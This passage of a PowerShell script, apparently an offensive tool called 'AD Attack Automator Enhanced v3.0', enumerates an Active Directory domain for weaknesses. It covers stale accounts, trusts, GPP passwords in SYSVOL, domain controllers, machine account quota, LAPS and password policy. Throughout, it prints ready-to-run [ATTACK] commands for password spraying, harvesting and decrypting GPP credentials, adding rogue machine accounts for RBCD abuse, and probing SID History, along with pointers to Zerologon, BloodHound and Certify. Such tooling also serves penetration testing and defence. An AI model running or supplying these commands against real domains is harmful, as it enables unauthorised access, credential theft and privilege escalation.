    foreach ($user in $results) {
        if ($user.lastlogon -and $user.lastlogon -lt $cutoff) {
            $lastLogon = [DateTime]::FromFileTime($user.lastlogon)
            $stale += [PSCustomObject]@{
                Account = $user.samaccountname
                LastLogon = $lastLogon
                DaysSinceLogon = [math]::Round(((Get-Date) - $lastLogon).TotalDays)
                PwdLastSet = if ($user.pwdlastset) { [DateTime]::FromFileTime($user.pwdlastset) } else { $null }
            }
        }
    }
    
    Write-Log "    Found: $($stale.Count)" -Level Success
    
    # Print findings directly to screen
    if ($stale.Count -gt 0) {
        Write-Host "`n  === STALE ACCOUNTS (90+ days inactive) ===" -ForegroundColor Yellow
        $topStale = $stale | Sort-Object DaysSinceLogon -Descending | Select-Object -First 10
        foreach ($account in $topStale) {
            Write-Host "  [*] Account: " -NoNewline -ForegroundColor Cyan
            Write-Host $account.Account -ForegroundColor White
            Write-Host "      Days Since Logon: $($account.DaysSinceLogon)" -ForegroundColor Gray
            Write-Host "      Last Logon: $($account.LastLogon)" -ForegroundColor Gray
            Write-Host ""
        }
        if ($stale.Count -gt 10) {
            Write-Host "  ... and $($stale.Count - 10) more stale accounts" -ForegroundColor Gray
        }
        
        Write-Host "`n  [INFO] Consider: Password spraying against stale accounts may have relaxed lockout monitoring" -ForegroundColor Yellow
        Write-Host ""
    }
    
    return $stale
}

function Get-DomainTrusts {
    Write-Log "  [*] Enumerating domain trusts..." -Level Info
    
    Log-Command "[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().GetAllTrustRelationships()" "Domain trust enumeration"
    Log-Command "Get-DomainTrust" "PowerView equivalent command"
    Log-Command "Get-ADTrust -Filter *" "AD Module equivalent"
    
    $trusts = @()
    try {
        $domain = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
        foreach ($trust in $domain.GetAllTrustRelationships()) {
            $trusts += [PSCustomObject]@{
                Source = $trust.SourceName
                Target = $trust.TargetName
                Direction = $trust.TrustDirection.ToString()
                Type = $trust.TrustType.ToString()
            }
        }
    }
    catch {}
    
    Write-Log "    Found: $($trusts.Count)" -Level Success
    
    # Print findings directly to screen
    if ($trusts.Count -gt 0) {
        Write-Host "`n  === DOMAIN TRUSTS ===" -ForegroundColor Yellow
        foreach ($trust in $trusts) {
            Write-Host "  [*] Trust: " -NoNewline -ForegroundColor Cyan
            Write-Host "$($trust.Source) -> $($trust.Target)" -ForegroundColor White
            Write-Host "      Direction: $($trust.Direction)" -ForegroundColor Gray
            Write-Host "      Type: $($trust.Type)" -ForegroundColor Gray
            
            # Add attack suggestions
            if ($trust.Direction -match "Bidirectional|Inbound") {
                Write-Host "      [ATTACK] Enumerate trusted domain: " -NoNewline -ForegroundColor Red
                Write-Host "Get-DomainUser -Domain $($trust.Target)" -ForegroundColor Yellow
                Write-Host "      [ATTACK] Check for SID History: " -NoNewline -ForegroundColor Red
                Write-Host "Get-DomainUser -Domain $($trust.Target) | ? {`$_.sidhistory} | Select samaccountname,sidhistory" -ForegroundColor Yellow
            }
            Write-Host ""
        }
    }
    
    return $trusts
}

function Get-GPPPasswords {
    param([string]$Domain)
    
    Write-Log "  [*] Searching for GPP passwords..." -Level Info
    
    if (-not $Domain) { 
        Write-Log "    No domain specified, skipping GPP search" -Level Warning
        return @() 
    }
    
    # Dynamically construct SYSVOL path with actual domain
    $sysvolPath = "\\$Domain\SYSVOL\$Domain"
    Log-Command "Searching: $sysvolPath\Policies\*\Machine\Preferences\*\*.xml" "GPP password search in SYSVOL"
    Log-Command "Get-GPPPassword" "PowerView/PowerSploit equivalent command"
    Log-Command "findstr /S /I cpassword \\$Domain\sysvol\$Domain\policies\*.xml" "Windows native search"
    
    $gppFiles = @()
    $paths = @(
        "$sysvolPath\Policies",
        "$sysvolPath\scripts"
    )
    
    $xmlPatterns = @('Groups.xml','Services.xml','Scheduledtasks.xml','DataSources.xml','Printers.xml','Drives.xml','Registry.xml')
    
    foreach ($basePath in $paths) {
        if (Test-Path $basePath) {
            Write-Log "    Searching: $basePath" -Level Info
            foreach ($pattern in $xmlPatterns) {
                $files = Get-ChildItem -Path $basePath -Filter $pattern -Recurse -ErrorAction SilentlyContinue
                foreach ($file in $files) {
                    try {
                        $content = Get-Content $file.FullName -Raw
                        if ($content -match 'cpassword="([^"]+)"') {
                            $gppFiles += [PSCustomObject]@{
                                File = $file.FullName
                                FileName = $file.Name
                                CPassword = $matches[1]
                            }
                        }
                    }
                    catch {}
                }
            }
        }
        else {
            Write-Log "    Path not accessible: $basePath" -Level Warning
        }
    }
    
    Write-Log "    Found: $($gppFiles.Count)" -Level Success
    
    # Print findings directly to screen
    if ($gppFiles.Count -gt 0) {
        Write-Host "`n  === GPP PASSWORDS FOUND ===" -ForegroundColor Yellow
        Write-Host "      [!!!] CRITICAL - PASSWORDS STORED IN SYSVOL!" -ForegroundColor Red
        foreach ($gpp in $gppFiles) {
            Write-Host "  [*] File: " -NoNewline -ForegroundColor Cyan
            Write-Host $gpp.FileName -ForegroundColor White
            Write-Host "      Path: $($gpp.File)" -ForegroundColor Gray
            Write-Host "      CPassword: " -NoNewline -ForegroundColor Red
            Write-Host $gpp.CPassword -ForegroundColor Yellow
            
            # Manual decryption command
            Write-Host "      [DECRYPT] PowerShell: " -NoNewline -ForegroundColor Red
            Write-Host "gpp-decrypt `"$($gpp.CPassword)`"" -ForegroundColor Yellow
            Write-Host "      [DECRYPT] Python: " -NoNewline -ForegroundColor Red
            Write-Host "python3 -c 'from Crypto.Cipher import AES; import base64; ...' # Use gpp-decrypt tool" -ForegroundColor Yellow
            Write-Host "      [DECRYPT] Metasploit: " -NoNewline -ForegroundColor Red
            Write-Host "msf> use post/windows/gather/credentials/gpp" -ForegroundColor Yellow
            Write-Host ""
        }
    }
    
    return $gppFiles
}

function Get-DomainControllers {
    Write-Log "  [*] Enumerating Domain Controllers..." -Level Info
    
    $filter = "(&(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=8192))"
    Log-Command "LDAP Filter: $filter" "Domain Controller enumeration using SERVER_TRUST_ACCOUNT flag"
    Log-Command "Get-DomainController" "PowerView equivalent command"
    Log-Command "Get-ADDomainController -Filter *" "AD Module equivalent"
    Log-Command "nltest /dclist:<domain>" "Windows native DC enumeration"
    
    $properties = @('name','dnshostname','operatingsystem','operatingsystemversion')
    
    $results = Invoke-LDAPQuery -Filter $filter -Properties $properties
    
    $dcs = @()
    foreach ($dc in $results) {
        $dcs += [PSCustomObject]@{
            Name = $dc.name
            DNS = $dc.dnshostname
            OS = $dc.operatingsystem
            OSVersion = $dc.operatingsystemversion
        }
    }
    
    Write-Log "    Found: $($dcs.Count)" -Level Success
    
    # Print findings directly to screen
    if ($dcs.Count -gt 0) {
        Write-Host "`n  === DOMAIN CONTROLLERS ===" -ForegroundColor Yellow
        foreach ($dc in $dcs) {
            Write-Host "  [*] DC: " -NoNewline -ForegroundColor Cyan
            Write-Host $dc.Name -ForegroundColor White
            Write-Host "      DNS: $($dc.DNS)" -ForegroundColor Gray
            Write-Host "      OS: $($dc.OS) $($dc.OSVersion)" -ForegroundColor Gray
            
            # Check for vulnerable OS versions
            if ($dc.OS -match "2008|2012") {
                Write-Host "      [!] VULNERABLE - Old OS version, check for CVE-2020-1472 (Zerologon)" -ForegroundColor Red
            }
            Write-Host ""
        }
    }
    
    return $dcs
}

function Get-MachineAccountQuota {
    Write-Log "  [*] Checking Machine Account Quota..." -Level Info
    
    Log-Command "Get-DomainObject -Identity 'DC=domain,DC=local' -Properties ms-DS-MachineAccountQuota" "PowerView command for MAQ"
    Log-Command "Get-ADDomain | Select -ExpandProperty DistinguishedName | Get-ADObject -Properties ms-DS-MachineAccountQuota" "AD Module equivalent"
    
    try {
        $domain = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
        $searcher = New-Object System.DirectoryServices.DirectorySearcher
        $searcher.SearchRoot = [ADSI]"LDAP://$($domain.Name)"
        $searcher.Filter = "(objectClass=domain)"
        [void]$searcher.PropertiesToLoad.Add("ms-DS-MachineAccountQuota")
        
        $result = $searcher.FindOne()
        if ($result) {
            $quota = $result.Properties["ms-ds-machineaccountquota"][0]
            Write-Log "    Quota: $quota" -Level Success
            
            Write-Host "`n  === MACHINE ACCOUNT QUOTA ===" -ForegroundColor Yellow
            Write-Host "  [*] Quota: " -NoNewline -ForegroundColor Cyan
            Write-Host $quota -ForegroundColor White
            
            if ($quota -gt 0) {
                Write-Host "      [!] Non-zero MAQ allows adding machine accounts" -ForegroundColor Red
                Write-Host "      [ATTACK] Add machine account (PowerMad): " -NoNewline -ForegroundColor Red
                Write-Host "New-MachineAccount -MachineAccount EVILPC -Password `$(ConvertTo-SecureString 'Pass123!' -AsPlainText -Force)" -ForegroundColor Yellow
                Write-Host "      [ATTACK] Impacket: " -NoNewline -ForegroundColor Red
                Write-Host "addcomputer.py DOMAIN/user:password -method SAMR -computer-name EVILPC$ -computer-pass Pass123! -dc-ip <DC_IP>" -ForegroundColor Yellow
                Write-Host "      [ATTACK] Use for RBCD: " -NoNewline -ForegroundColor Red
                Write-Host "Set-ADComputer <target> -PrincipalsAllowedToDelegateToAccount EVILPC$" -ForegroundColor Yellow
            }
            else {
                Write-Host "      [+] MAQ is 0 - Cannot add machine accounts" -ForegroundColor Green
            }
            Write-Host ""
            
            return $quota
        }
    }
    catch {}
    
    return $null
}

function Get-LAPSStatus {
    Write-Log "  [*] Checking LAPS deployment..." -Level Info
    
    Log-Command "Get-DomainComputer | Select-Object name,ms-mcs-admpwd,ms-mcs-admpwdexpirationtime" "PowerView command for LAPS"
    Log-Command "Get-ADComputer -Filter * -Properties ms-Mcs-AdmPwd | Where-Object {`$_.'ms-Mcs-AdmPwd'} | Select Name,ms-Mcs-AdmPwd" "AD Module equivalent"
    
    $filter = "(objectCategory=computer)"
    $properties = @('name','ms-mcs-admpwd','ms-mcs-admpwdexpirationtime')
    
    $results = Invoke-LDAPQuery -Filter $filter -Properties $properties
    
    $lapsComputers = @()
    foreach ($comp in $results) {
        if ($comp.'ms-mcs-admpwd' -or $comp.'ms-mcs-admpwdexpirationtime') {
            $lapsComputers += [PSCustomObject]@{
                Computer = $comp.name
                HasPassword = [bool]$comp.'ms-mcs-admpwd'
                Expiration = if ($comp.'ms-mcs-admpwdexpirationtime') { 
                    [DateTime]::FromFileTime($comp.'ms-mcs-admpwdexpirationtime') 
                } else { $null }
            }
        }
    }
    
    $totalComputers = $results.Count
    $lapsEnabled = $lapsComputers.Count
    $percentage = if ($totalComputers -gt 0) { [math]::Round(($lapsEnabled / $totalComputers) * 100, 2) } else { 0 }
    
    Write-Log "    LAPS enabled: $lapsEnabled/$totalComputers ($percentage%)" -Level Success
    
    Write-Host "`n  === LAPS STATUS ===" -ForegroundColor Yellow
    Write-Host "  [*] Total Computers: " -NoNewline -ForegroundColor Cyan
    Write-Host $totalComputers -ForegroundColor White
    Write-Host "  [*] LAPS Enabled: " -NoNewline -ForegroundColor Cyan
    Write-Host "$lapsEnabled ($percentage%)" -ForegroundColor White
    
    if ($lapsEnabled -lt $totalComputers) {
        Write-Host "      [!] $($totalComputers - $lapsEnabled) computers without LAPS - potential targets" -ForegroundColor Red
    }
    
    if ($lapsEnabled -gt 0) {
        Write-Host "      [INFO] Check LAPS read permissions: " -NoNewline -ForegroundColor Yellow
        Write-Host "Get-DomainOU | Get-DomainObjectAcl -ResolveGUIDs | ? {`$_.ObjectAceType -eq 'ms-Mcs-AdmPwd'}" -ForegroundColor Magenta
    }
    Write-Host ""
    
    return [PSCustomObject]@{
        TotalComputers = $totalComputers
        LAPSEnabled = $lapsEnabled
        Percentage = $percentage
        Computers = $lapsComputers
    }
}

function Get-WeakPasswordPolicy {
    Write-Log "  [*] Checking password policy..." -Level Info
    
    Log-Command "Get-DomainPolicy | Select-Object -ExpandProperty SystemAccess" "PowerView command for password policy"
    Log-Command "Get-ADDefaultDomainPasswordPolicy" "AD Module equivalent"
    Log-Command "net accounts /domain" "Windows native command"
    
    try {
        $domain = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
        $domainDN = "DC=" + ($domain.Name -replace '\.',',DC=')
        
        $searcher = New-Object System.DirectoryServices.DirectorySearcher
        $searcher.SearchRoot = [ADSI]"LDAP://$domainDN"
        $searcher.Filter = "(objectClass=domainDNS)"
        $props = @('minPwdLength','pwdProperties','maxPwdAge','minPwdAge','lockoutThreshold','lockoutDuration')
        $props | ForEach-Object { [void]$searcher.PropertiesToLoad.Add($_) }
        
        $result = $searcher.FindOne()
        if ($result) {
            $policy = [PSCustomObject]@{
                MinPasswordLength = $result.Properties['minpwdlength'][0]
                PasswordComplexity = ($result.Properties['pwdproperties'][0] -band 1) -eq 1
                MaxPasswordAge = [TimeSpan]::FromTicks([Math]::Abs($result.Properties['maxpwdage'][0])).Days
                MinPasswordAge = [TimeSpan]::FromTicks([Math]::Abs($result.Properties['minpwdage'][0])).Days
                LockoutThreshold = $result.Properties['lockoutthreshold'][0]
                LockoutDuration = [TimeSpan]::FromTicks([Math]::Abs($result.Properties['lockoutduration'][0])).Minutes
            }
            
            Write-Log "    MinLength: $($policy.MinPasswordLength) | Complexity: $($policy.PasswordComplexity) | Lockout: $($policy.LockoutThreshold)" -Level Success
            
            Write-Host "`n  === PASSWORD POLICY ===" -ForegroundColor Yellow
            Write-Host "  [*] Min Password Length: " -NoNewline -ForegroundColor Cyan
            Write-Host $policy.MinPasswordLength -ForegroundColor White
            Write-Host "  [*] Complexity Enabled: " -NoNewline -ForegroundColor Cyan
            Write-Host $policy.PasswordComplexity -ForegroundColor White
            Write-Host "  [*] Max Password Age: " -NoNewline -ForegroundColor Cyan
            Write-Host "$($policy.MaxPasswordAge) days" -ForegroundColor White
            Write-Host "  [*] Min Password Age: " -NoNewline -ForegroundColor Cyan
            Write-Host "$($policy.MinPasswordAge) days" -ForegroundColor White
            Write-Host "  [*] Lockout Threshold: " -NoNewline -ForegroundColor Cyan
            Write-Host "$($policy.LockoutThreshold) attempts" -ForegroundColor White
            Write-Host "  [*] Lockout Duration: " -NoNewline -ForegroundColor Cyan
            Write-Host "$($policy.LockoutDuration) minutes" -ForegroundColor White
            
            # Check for weak policy
            $weaknesses = @()
            if ($policy.MinPasswordLength -lt 8) {
                $weaknesses += "Min password length < 8"
            }
            if ($policy.MinPasswordLength -lt 14) {
                $weaknesses += "Min password length < 14 (recommended)"
            }
            if (-not $policy.PasswordComplexity) {
                $weaknesses += "Password complexity not enabled"
            }
            if ($policy.LockoutThreshold -eq 0) {
                $weaknesses += "No account lockout policy"
            }
            if ($policy.LockoutThreshold -gt 0 -and $policy.LockoutThreshold -lt 5) {
                $weaknesses += "Low lockout threshold (< 5)"
            }
            
            if ($weaknesses.Count -gt 0) {
                Write-Host "`n  [!] PASSWORD POLICY WEAKNESSES DETECTED:" -ForegroundColor Red
                foreach ($weakness in $weaknesses) {
                    Write-Host "      - $weakness" -ForegroundColor Red
                }
                
                Write-Host "`n  [ATTACK] Password spraying viable:" -ForegroundColor Yellow
                Write-Host "           DomainPasswordSpray.ps1 -Password Winter2024! -OutFile sprayed.txt" -ForegroundColor Magenta
                Write-Host "           crackmapexec smb <target> -u users.txt -p 'Winter2024!' --continue-on-success" -ForegroundColor Magenta
            }
            else {
                Write-Host "`n  [+] Password policy appears strong" -ForegroundColor Green
            }
            Write-Host ""
            
            return $policy
        }
    }
    catch {}
    
    return $null
}

# ================================================
# MAIN EXECUTION
# ================================================

function Start-ADEnumeration {
    Write-Host "`n========================================" -ForegroundColor Cyan
    Write-Host "  AD Attack Automator Enhanced v3.0" -ForegroundColor Cyan
    Write-Host "========================================`n" -ForegroundColor Cyan
    
    # Detect environment
    $adEnv = Test-ADEnvironment
    
    if (-not $adEnv.IsADJoined) {
        Write-Log "Cannot enumerate - not joined to AD domain" -Level Error
        return
    }
    
    Write-Host "`n  [Environment Info]" -ForegroundColor Yellow
    Write-Host "  Domain: $($adEnv.Domain)" -ForegroundColor White
    Write-Host "  DC: $($adEnv.DomainController)" -ForegroundColor White
    Write-Host "  User: $($adEnv.CurrentUser)" -ForegroundColor White
    Write-Host "  Elevated: $($adEnv.IsElevated)" -ForegroundColor White
    Write-Host ""
    
    # Check tools
    $tools = Get-AvailableTools
    Write-Log "Available tools: $($tools -join ', ')" -Level Info
    
    # Initialize results
    $results = @{
        Environment = $adEnv
        ASREPRoastable = @()
        Kerberoastable = @()
        Unconstrained = @()
        Constrained = @()
        RBCD = @()
        PasswordInDescription = @()
        PasswordNotRequired = @()
        AdminAccounts = @()
        PrivilegedGroups = @()
        StaleAccounts = @()
        DomainTrusts = @()
        GPPPasswords = @()
        DomainControllers = @()
        PasswordPolicy = $null
        LAPSStatus = $null
        MachineAccountQuota = $null
    }
    
    Write-Host "`nStarting enumeration...`n" -ForegroundColor Cyan
    
    # Run enumerations with domain parameter
    $results.ASREPRoastable = Get-ASREPRoastableAccounts -Domain $adEnv.Domain
    $results.Kerberoastable = Get-KerberoastableAccounts -Domain $adEnv.Domain
    $results.Unconstrained = Get-UnconstrainedDelegation
    $results.Constrained = Get-ConstrainedDelegation
    $results.RBCD = Get-RBCDTargets
    $results.PasswordInDescription = Get-PasswordInDescription
    $results.PasswordNotRequired = Get-PasswordNotRequired
    $results.AdminAccounts = Get-AdminAccounts
    $results.PrivilegedGroups = Get-PrivilegedGroupMembers
    $results.DomainTrusts = Get-DomainTrusts
    $results.DomainControllers = Get-DomainControllers
    $results.PasswordPolicy = Get-WeakPasswordPolicy
    $results.MachineAccountQuota = Get-MachineAccountQuota
    
    if (-not $QuickScan) {
        $results.StaleAccounts = Get-StaleAccounts -Days 90
        $results.GPPPasswords = Get-GPPPasswords -Domain $adEnv.Domain
        $results.LAPSStatus = Get-LAPSStatus
    }
    
    # Display executed commands summary
    Write-Host "`n========================================" -ForegroundColor Cyan
    Write-Host "     EXECUTED COMMANDS SUMMARY" -ForegroundColor Cyan
    Write-Host "========================================`n" -ForegroundColor Cyan
    
    foreach ($cmd in $Global:ExecutedCommands) {
        Write-Host "[$($cmd.Time)] " -NoNewline -ForegroundColor Gray
        Write-Host "$($cmd.Description)" -ForegroundColor Cyan
        Write-Host "         $($cmd.Command)" -ForegroundColor Magenta
        Write-Host ""
    }
    
    # Summary Statistics
    Write-Host "`n========================================" -ForegroundColor Green
    Write-Host "     ENUMERATION SUMMARY" -ForegroundColor Green
    Write-Host "========================================`n" -ForegroundColor Green
    
    $criticalFindings = 0
    $highFindings = 0
    
    if ($results.ASREPRoastable.Count -gt 0) {
        Write-Host "  [HIGH] AS-REP Roastable: " -NoNewline -ForegroundColor Yellow
        Write-Host $results.ASREPRoastable.Count -ForegroundColor White
        $highFindings += $results.ASREPRoastable.Count
    }
    
    if ($results.Kerberoastable.Count -gt 0) {
        Write-Host "  [HIGH] Kerberoastable: " -NoNewline -ForegroundColor Yellow
        Write-Host $results.Kerberoastable.Count -ForegroundColor White
        $highFindings += $results.Kerberoastable.Count
    }
    
    if ($results.Unconstrained.Count -gt 0) {
        Write-Host "  [CRITICAL] Unconstrained Delegation: " -NoNewline -ForegroundColor Red
        Write-Host $results.Unconstrained.Count -ForegroundColor White
        $criticalFindings += $results.Unconstrained.Count
    }
    
    if ($results.GPPPasswords.Count -gt 0) {
        Write-Host "  [CRITICAL] GPP Passwords: " -NoNewline -ForegroundColor Red
        Write-Host $results.GPPPasswords.Count -ForegroundColor White
        $criticalFindings += $results.GPPPasswords.Count
    }
    
    if ($results.PasswordInDescription.Count -gt 0) {
        Write-Host "  [HIGH] Passwords in Description: " -NoNewline -ForegroundColor Yellow
        Write-Host $results.PasswordInDescription.Count -ForegroundColor White
        $highFindings += $results.PasswordInDescription.Count
    }
    
    if ($results.PasswordNotRequired.Count -gt 0) {
        Write-Host "  [MEDIUM] Password Not Required: " -NoNewline -ForegroundColor Cyan
        Write-Host $results.PasswordNotRequired.Count -ForegroundColor White
    }
    
    if ($results.StaleAccounts.Count -gt 0) {
        Write-Host "  [LOW] Stale Accounts: " -NoNewline -ForegroundColor Gray
        Write-Host $results.StaleAccounts.Count -ForegroundColor White
    }
    
    Write-Host "`n  Total Admin Accounts: $($results.AdminAccounts.Count)" -ForegroundColor Cyan
    Write-Host "  Domain Controllers: $($results.DomainControllers.Count)" -ForegroundColor Cyan
    Write-Host "  Domain Trusts: $($results.DomainTrusts.Count)" -ForegroundColor Cyan
    
    Write-Host "`n  [*] Critical Findings: " -NoNewline -ForegroundColor Red
    Write-Host $criticalFindings -ForegroundColor White
    Write-Host "  [*] High Findings: " -NoNewline -ForegroundColor Yellow
    Write-Host $highFindings -ForegroundColor White
    
    Write-Host "`n========================================" -ForegroundColor Green
    Write-Host "     Enumeration Complete!" -ForegroundColor Green
    Write-Host "========================================" -ForegroundColor Green
    
    if ($Global:EnumErrors.Count -gt 0) {
        Write-Host "`nErrors encountered: $($Global:EnumErrors.Count)" -ForegroundColor Yellow
        foreach ($err in $Global:EnumErrors) {
            Write-Host "  [$($err.Time.ToString('HH:mm:ss'))] $($err.Error): $($err.Details)" -ForegroundColor Red
        }
    }
    
    Write-Host "`n[*] Consider running BloodHound for ACL analysis: .\SharpHound.exe -c All" -ForegroundColor Magenta
    Write-Host "[*] Consider checking for vulnerable certificates: Certify.exe find /vulnerable" -ForegroundColor Magenta
    Write-Host ""
    
    return $results
}

# Execute
Start-ADEnumeration
